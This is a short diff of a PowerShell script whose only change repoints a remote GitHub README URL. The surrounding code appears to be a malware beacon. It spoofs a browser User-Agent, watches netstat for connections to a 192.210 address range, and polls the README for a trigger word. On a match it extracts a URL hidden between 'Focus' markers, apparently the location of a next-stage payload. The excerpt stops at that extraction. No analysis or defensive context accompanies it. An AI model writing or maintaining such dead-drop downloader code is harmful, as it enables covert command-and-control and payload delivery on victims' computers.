@@ -1,6 +1,6 @@
    $Word = 'GGGHHHJJJ_now'
         $WebClientObject = New-Object Net.WebClient
-        $comment = "https://raw.githubusercontent.com/raistlinm/check/master/README.md"
+        $comment = "https://raw.githubusercontent.com/raistlinm/3/master/README.md"
         $WebClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36)")
         While($conn -ne 0){
             netstat -an |findstr EST |findstr 192.210
@@ -9,7 +9,7 @@
                 $Found = $CommentResult.contains($Word)
                 If($Found) {
                         $WebClientObject = New-Object Net.WebClient
-                        $comment = "https://raw.githubusercontent.com/raistlinm/check/master/README.md"
+                        $comment = "https://raw.githubusercontent.com/raistlinm/3/master/README.md"
                         $WebClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36)")
                         $CommentResult -match "(?<=.*Focus).+(?=Focus.*)"
                         $url = $matches[0]
